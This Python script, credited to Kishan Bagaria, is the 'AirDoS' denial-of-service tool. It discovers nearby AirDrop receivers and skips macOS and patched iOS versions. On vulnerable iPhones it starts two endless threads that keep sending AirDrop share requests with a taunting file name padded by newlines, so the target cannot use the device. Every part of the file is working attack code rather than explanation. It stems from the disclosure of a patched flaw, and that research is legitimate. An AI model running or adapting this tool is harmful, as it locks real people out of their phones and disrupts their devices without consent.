#!/usr/bin/env python3
"""
AirDoS by Kishan Bagaria

https://kishanbagaria.com/airdos/
"""

import ipaddress
import json
import logging
import plistlib
import random
import threading

from colorama import Fore, Back, Style

from opendrop.client import AirDropBrowser, AirDropClient
from opendrop.config import AirDropConfig, AirDropReceiverFlags

start_new_lines = '\n' * 10
end_new_lines = '\n' * 100
SENDER_NAME = 'Attacker 😈'
FILE_NAME = f"""
{start_new_lines}
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

😈😈😈😈😈
You can no longer use this device
Go outside and play!

⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
{end_new_lines}
😈
"""

rand = lambda: '{0:0{1}x}'.format(random.randint(0, 0xffffffffffff), 12)
attack_counts = {}
config = AirDropConfig()
logger = logging.getLogger(__name__)

logging.basicConfig(level=logging.INFO, format=f'{Style.DIM}%(asctime)s{Style.RESET_ALL} %(message)s')

def get_os_version(discover):
    try:
        receiver_media_cap = json.loads(discover['ReceiverMediaCapabilities'])
        return receiver_media_cap['Vendor']['com.apple']['OSVersion']
    except:
        pass

def get_is_mac(os_version):
    if os_version:
        if os_version[0] == 10 and os_version[1] >= 7:
            return True
    return False

def get_is_vuln(os_version):
    if os_version:
        if (os_version[0] == 13 and os_version[1] >= 3) or os_version[0] >= 14:
            return False
    return True

def send_ask(node_info):
    ask_body = {
        'SenderComputerName': SENDER_NAME,
        'SenderModelName': rand(),
        'SenderID': rand(),
        'BundleID': 'com.apple.finder',
        'Files': [{
            'FileName': FILE_NAME,
            'FileType': 'public.plain-text'
        }]
    }
    ask_binary = plistlib.dumps(ask_body, fmt=plistlib.FMT_BINARY)
    id = node_info['id']
    attack_counts[id] = attack_counts.get(id, 1) + 1
    try:
        client = AirDropClient(config, (node_info['address'], node_info['port']))
        success, _ = client.send_POST('/Ask', ask_binary)
        if success: # if user accepted
            client.send_POST('/Upload', None)
        return success
    except:
        pass

def send(node_info):
    name = node_info['name']
    id = node_info['id']
    attack_count = attack_counts.get(id, 1)
    receiver_name = Fore.GREEN + name + Fore.RESET
    logging.info(f'❔ Prompting   {receiver_name} (#{attack_count})')
    success = send_ask(node_info)
    if success == True:
        logging.info(f'✅ Accepted by {receiver_name} (#{attack_count})')
    elif success == False:
        logging.info(f'❎ Declined by {receiver_name} (#{attack_count})')
    else:
        logging.info(f'🛑 Errored     {receiver_name} (#{attack_count})')
    return success

def brute(node_info):
    error_count = 0
    while True:
        if send(node_info) == None:
            error_count += 1
            if error_count > 2:
                break

def start_brute(node_info):
    # two threads just for good measure
    # this makes sure there is always another popup to decline if there is any network delay
    for i in range(2):
        thread = threading.Thread(target=brute, args=(node_info,))
        thread.start()

def found_receiver(info):
    thread = threading.Thread(target=on_receiver_found, args=(info,))
    thread.start()

def send_discover(client):
    discover_body = {}
    discover_plist_binary = plistlib.dumps(discover_body, fmt=plistlib.FMT_BINARY)
    success, response_bytes = client.send_POST('/Discover', discover_plist_binary)
    response = plistlib.loads(response_bytes)
    return response

def on_receiver_found(info):
    try:
        address = ipaddress.ip_address(info.address).compressed
    except ValueError:
        return
    id = info.name.split('.')[0]
    hostname = info.server
    port = int(info.port)
    client = AirDropClient(config, (address, int(port)))
    flags = int(info.properties[b'flags'])

    receiver_name = None
    if flags & AirDropReceiverFlags.SUPPORTS_DISCOVER_MAYBE:
        try:
            discover = send_discover(client)
            receiver_name = discover.get('ReceiverComputerName')
            os_version = get_os_version(discover)
        except:
            pass
    discoverable = receiver_name is not None

    node_info = {
        'name': receiver_name,
        'address': address,
        'port': port,
        'id': id,
        'flags': flags,
        'discoverable': discoverable,
    }
    if discoverable:
        os_v = '.'.join(map(str, os_version)) if os_version else ''
        is_mac = get_is_mac(os_version)
        is_vuln = get_is_vuln(os_version)
        additional = f'{Style.DIM}{id} {hostname} [{address}]:{port}{Style.RESET_ALL}'
        if is_mac:
            logger.info('❌ Ignoring    {:32} macOS {:>7} {}'.format(Fore.YELLOW + receiver_name + Fore.RESET, os_v, additional))
        elif not is_vuln:
            logger.info('❌ Ignoring    {:32} iOS   {:>7} {}'.format(Fore.RED + receiver_name + Fore.RESET, os_v, additional))
        else:
            logger.info('🔍 Found       {:32} iOS   {:>7} {}'.format(Fore.GREEN + receiver_name + Fore.RESET, os_v, additional))
            start_brute(node_info)


logger.info('⏳ Looking for devices... Open Finder -> AirDrop')
browser = AirDropBrowser(config)
browser.start(callback_add=found_receiver)
try:
    input()
except KeyboardInterrupt:
    pass
finally:
    if browser is not None:
        browser.stop()
